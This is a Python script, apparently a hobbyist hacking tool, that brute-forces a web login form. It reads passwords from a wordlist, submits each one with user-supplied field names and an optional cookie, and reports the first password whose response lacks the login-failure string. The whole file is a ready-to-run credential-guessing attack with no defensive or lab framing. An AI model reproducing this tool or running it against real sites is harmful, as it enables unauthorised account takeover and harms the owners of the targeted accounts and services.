import requests, termcolor

url_link = input(termcolor.colored("[*]Enter Page URL: ",color='cyan',attrs=['bold']))
username = input(termcolor.colored("[*]Enter username: ",color='cyan',attrs=['bold']))
password_file = input(termcolor.colored('[*]Enter relative path to password file: ',color='cyan',attrs=['bold']))

def cracking(username,url):
    username_field = input(termcolor.colored('[*]Enter username field name: ','cyan',attrs=['bold']))
    password_field = input(termcolor.colored('[*]Enter password field name: ','cyan',attrs=['bold']))
    submit_button = input(termcolor.colored('[*]Enter submit button name: ','cyan',attrs=['bold']))
    login_failure = input(termcolor.colored('[*]Enter login failure string: ','cyan',attrs=['bold']))
    cookie_name = input(termcolor.colored('[*]Enter cookie name from requests (optional): ','cyan',attrs=['bold']))
    cookie_value = input(termcolor.colored('[*]Enter cookie_value (optional): ','cyan',attrs=['bold']))
    for password in passwords:
        password = password.strip()
        print(termcolor.colored('[*]Trying {0}'.format(password),color='yellow',attrs=['bold']))
        data__ = {username_field:username,password_field:password,submit_button:'submit'}
        if cookie_name != '':
            response = requests.get(url,params={username_field:username,password_field:password,submit_button:submit_button},cookies={cookie_name:cookie_value})
        else:
            response = requests.post(url,data=data__)
        if login_failure in response.content.decode():
            pass
        else:
            print(termcolor.colored('[+]Credentials Found ===> {0}:{1}'.format(username,password),'green',attrs=['bold']))
            exit()
with open(password_file,"r") as passwords:
    cracking(username,url_link)

print(termcolor.colored('[!!] Password not in list!','red',attrs='bold'))